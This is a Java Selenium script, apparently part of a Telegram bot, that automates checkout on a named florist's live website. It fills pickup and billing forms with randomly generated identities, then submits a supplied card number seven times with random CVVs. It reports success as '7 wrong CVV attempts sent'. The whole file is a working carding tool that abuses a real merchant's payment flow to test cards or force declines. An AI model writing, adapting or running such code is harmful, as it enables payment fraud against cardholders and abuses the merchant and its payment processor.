package com.tammudu.files;

import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.*;

import java.time.Duration;
import java.util.List;
import java.util.Random;

public class RealTimeSeleniumProcessor {

    private static WebDriver driver;
    private static WebDriverWait wait;
    private static final Random random = new Random();

    public static void preloadCheckoutPage() {
        System.setProperty("webdriver.chrome.driver", "D:/MyPro1/telegrambot/drivers/chromedriver.exe");

        ChromeOptions options = new ChromeOptions();
        options.addArguments("--remote-allow-origins=*");
        driver = new ChromeDriver(options);
        wait = new WebDriverWait(driver, Duration.ofSeconds(15));

        try {
            driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10));
            driver.get("https://www.suzanns.com/");

            // Step 1: Click random product
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector(".m-product-mini a.homePageEngagement")));
            List<WebElement> products = driver.findElements(By.cssSelector(".m-product-mini a.homePageEngagement"));
            if (products.isEmpty()) throw new RuntimeException("No products found on homepage.");
            WebElement randomProduct = products.get(random.nextInt(products.size()));
            randomProduct.click();

            // Step 2: Fill ZIP code
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("postalCode")));
            WebElement zipInput = driver.findElement(By.id("postalCode"));
            zipInput.clear();
            zipInput.sendKeys("91759");

            // Step 3: Open Delivery Date calendar
            WebElement deliveryDateInput = wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("delivery_date")));
            ((JavascriptExecutor) driver).executeScript("arguments[0].removeAttribute('readonly')", deliveryDateInput);

            // Click to open calendar
            deliveryDateInput.click();
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector(".picker__day--today")));
            Thread.sleep(300);

            try {
                WebElement todayDate = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector(".picker__day--today")));
                todayDate.click();
                wait.until(ExpectedConditions.invisibilityOfElementLocated(By.cssSelector(".picker__day--today")));
            } catch (StaleElementReferenceException e) {
                WebElement todayDateRetry = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector(".picker__day--today")));
                todayDateRetry.click();
                wait.until(ExpectedConditions.invisibilityOfElementLocated(By.cssSelector(".picker__day--today")));
            }

            // ✅ Trigger blur() after selecting date
            ((JavascriptExecutor) driver).executeScript("arguments[0].blur();", deliveryDateInput);
            Thread.sleep(500);

            // Step 4: Wait for Delivery Radio Options
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("deliveryRadios")));

            // Step 5: Click Today's Delivery Radio Button
            WebElement todayDelivery = driver.findElement(By.id("deliveryDate-ss-1"));
            ((JavascriptExecutor) driver).executeScript("arguments[0].click();", todayDelivery);

            Thread.sleep(800);

            // Step 6: Click Add to Cart
            Thread.sleep(500);
            WebElement fakeAddToCartButton = wait.until(ExpectedConditions.elementToBeClickable(By.id("sanitize-add-to-cart")));
            fakeAddToCartButton.click();

            // Step 7: Try clicking Continue to Checkout
            try {
                WebElement continueButton = wait.until(ExpectedConditions.elementToBeClickable(By.id("shoppingCartBtn2")));
                continueButton.click();
            } catch (TimeoutException e) {
                System.out.println("⚠️ Warning: shoppingCartBtn2 not found, page auto-redirected.");
            }

            // Step 8: Fill Pickup Information
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("firstName0")));
            driver.findElement(By.id("firstName0")).sendKeys(RandomBillingInfo.randomFirstName());
            driver.findElement(By.id("lastName0")).sendKeys(RandomBillingInfo.randomLastName());

            // ✅ NEW: Pickup in Store flow

            // 1. Click Pickup In Store Checkbox safely
            WebElement pickupCheckbox = driver.findElement(By.id("deliveryEfloristStorePickup-1"));
            ((JavascriptExecutor) driver).executeScript("arguments[0].scrollIntoView(true);", pickupCheckbox);
            Thread.sleep(500);
            ((JavascriptExecutor) driver).executeScript("arguments[0].click();", pickupCheckbox);

            // 2. Select "Suzann's Flowers" from Pickup Store Dropdown
            WebElement storeDropdown = wait.until(ExpectedConditions.elementToBeClickable(By.id("storePickupLocationId-0")));
            Select storeSelect = new Select(storeDropdown);
            storeSelect.selectByVisibleText("Suzann's Flowers");

            // ✅ Important: Wait for Pickup Time dropdown to refresh
            Thread.sleep(1500);

            // 3. Select 11:00 AM from Pickup Time Dropdown
            WebElement pickupTimeDropdown = wait.until(ExpectedConditions.elementToBeClickable(By.id("pickUpTime-1")));
            Select timeSelect = new Select(pickupTimeDropdown);
            timeSelect.selectByVisibleText("11:00 AM");

            // ✅ 4. Click "Please Select..." text first
            WebElement pleaseSelectLink = wait.until(ExpectedConditions.elementToBeClickable(By.xpath("//a[contains(text(), 'Please Select...')]")));
            pleaseSelectLink.click();
            Thread.sleep(500); // wait for options to expand

            // ✅ 5. Now click "No Card Message"
            WebElement noCardMessageOption = wait.until(ExpectedConditions.elementToBeClickable(By.xpath("//a[contains(text(), 'No Card Message')]")));
            noCardMessageOption.click();
            Thread.sleep(500); // wait after selection

            // 6. Click "Next: Billing & Review" button
            WebElement nextButton = wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector(".deliveryInfoBtn.isBottom")));
            nextButton.click();

            // Step 9: Wait for Billing Page
            wait.until(ExpectedConditions.visibilityOfElementLocated(By.name("cc_number")));

        } catch (Exception e) {
            driver.quit();
            throw new RuntimeException("❌ Preloading failed: " + e.getMessage());
        }
    }

    public static String processPayment(String cardNumber, String expMonth, String expYear) {
        try {
            for (int i = 0; i < 7; i++) {
                String randomCVV = generateRandomCVV();

                driver.findElement(By.name("cc_number")).clear();
                driver.findElement(By.name("cc_month")).clear();
                driver.findElement(By.name("cc_year")).clear();
                driver.findElement(By.name("cvv_number")).clear();

                driver.findElement(By.name("cc_number")).sendKeys(cardNumber);
                driver.findElement(By.name("cc_month")).sendKeys(expMonth);
                driver.findElement(By.name("cc_year")).sendKeys(expYear);
                driver.findElement(By.name("cvv_number")).sendKeys(randomCVV);

                Select cardTypeDropdown = new Select(driver.findElement(By.id("ccTypeDropDown")));
                char firstDigit = cardNumber.charAt(0);
                if (firstDigit == '4') cardTypeDropdown.selectByValue("FDPYT1001"); // VISA
                else if (firstDigit == '5') cardTypeDropdown.selectByValue("FDPYT1002"); // MasterCard
                else if (firstDigit == '3') cardTypeDropdown.selectByValue("FDPYT1007"); // American Express
                else if (firstDigit == '6') cardTypeDropdown.selectByValue("FDPYT1003"); // Discover

                driver.findElement(By.name("first_name")).clear();
                driver.findElement(By.name("last_name")).clear();
                driver.findElement(By.name("address1")).clear();
                driver.findElement(By.name("city")).clear();
                driver.findElement(By.name("territory")).clear();
                driver.findElement(By.name("zip")).clear();
                driver.findElement(By.name("phone_number")).clear();
                driver.findElement(By.name("email")).clear();

                driver.findElement(By.name("first_name")).sendKeys(RandomBillingInfo.randomFirstName());
                driver.findElement(By.name("last_name")).sendKeys(RandomBillingInfo.randomLastName());
                driver.findElement(By.name("address1")).sendKeys(RandomBillingInfo.randomAddress());
                driver.findElement(By.name("city")).sendKeys(RandomBillingInfo.randomCity());
                driver.findElement(By.name("territory")).sendKeys(RandomBillingInfo.randomStateCode());
                driver.findElement(By.name("zip")).sendKeys(RandomBillingInfo.randomZip());
                driver.findElement(By.name("phone_number")).sendKeys(RandomBillingInfo.randomPhone());
                driver.findElement(By.name("email")).sendKeys(RandomBillingInfo.randomEmail());

                WebElement placeOrderButton = driver.findElement(By.name("billingReviewSubBtn"));
                placeOrderButton.click();

                Thread.sleep(400 + random.nextInt(200));
            }

            return "✅ 7 wrong CVV attempts sent successfully under 10 seconds.";

        } catch (Exception e) {
            driver.quit();
            return "❌ Error during card processing: " + e.getMessage();
        }
    }

    private static String generateRandomCVV() {
        int randomCVV = 100 + random.nextInt(900);
        return String.valueOf(randomCVV);
    }
}
